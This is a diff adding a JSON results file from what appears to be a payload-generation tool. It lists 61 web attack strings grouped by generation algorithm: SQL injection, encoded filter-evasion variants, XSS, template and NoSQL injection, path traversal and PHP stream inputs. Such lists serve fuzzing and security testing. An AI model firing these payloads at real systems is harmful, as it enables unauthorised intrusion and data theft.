@@ -1,0 +1,88 @@
+{
+  "timestamp": "2025-10-27T19:37:37.763335",
+  "demonstrations": {
+    "neural_network": {
+      "count": 4,
+      "samples": [
+        "' and 1=convert(int, 'test')--",
+        "' OR 1=1 --",
+        "' UNION SELECT NULL,NULL--",
+        "admin'--"
+      ]
+    },
+    "genetic": {
+      "count": 15,
+      "samples": [
+        "' OR 1=1\\--",
+        "' OR 1=T --",
+        "' OR 1=1 |-",
+        "' ORj1=1 --",
+        "' OR 1n1 --"
+      ]
+    },
+    "reinforcement_learning": {
+      "count": 7,
+      "samples": [
+        "admin'--",
+        "%27%20UNION%20SELECT%20NULL%2CNULL--",
+        "' AND 1=CONVERT(int, 'test')--",
+        "admin%27--",
+        "%27%20OR%201%3D1%20--"
+      ]
+    },
+    "particle_swarm": {
+      "count": 7,
+      "samples": [
+        "admin'--",
+        "' AND 1=CONVERT(int, 'test')--",
+        "'/**/OR/**/1=1/**/--",
+        "'/**/UNION/**/SELECT/**/NULL,NULL--",
+        "'/**/AND/**/1=CONVERT(int,/**/'test')--"
+      ]
+    },
+    "adversarial": {
+      "count": 8,
+      "samples": [
+        "%2527%2520OR%25201%253D1%2520--",
+        "%2527%2520Or%25201%253D1%2520--",
+        "%252525252527%252525252520Or%2525252525201%25252525253D1%252525252520--",
+        "%25252527%25252520OR%252525201%2525253D1%25252520--",
+        "%25252527%25252520Or%252525201%2525253D1%25252520--"
+      ]
+    },
+    "context_aware": {
+      "count": 6,
+      "samples": [
+        "<?php echo \"test\"; ?>",
+        "php://input",
+        "..%2F",
+        "%00",
+        "test<script>alert(1)</script>"
+      ]
+    },
+    "template_based": {
+      "count": 10,
+      "samples": [
+        "admin'--",
+        "' AND 1=CONVERT(INT, 'TEST')--",
+        "%27%20UNION%20SELECT%20NULL%2CNULL--",
+        "ADMIN'--",
+        "' AND 1=CONVERT(int, 'test')--"
+      ]
+    },
+    "polyglot": {
+      "count": 4,
+      "samples": [
+        "';alert(String.fromCharCode(88,83,83))//",
+        "{{7*'7'}}${7*'7'}<%=7*'7'%>",
+        "' OR 1=1--}{\"$ne\":null}",
+        "<script>alert(1)</script><?php echo 'test';?>"
+      ]
+    }
+  },
+  "summary": {
+    "total_payloads_generated": 61,
+    "algorithms_demonstrated": 8,
+    "execution_time": "completed"
+  }
+}
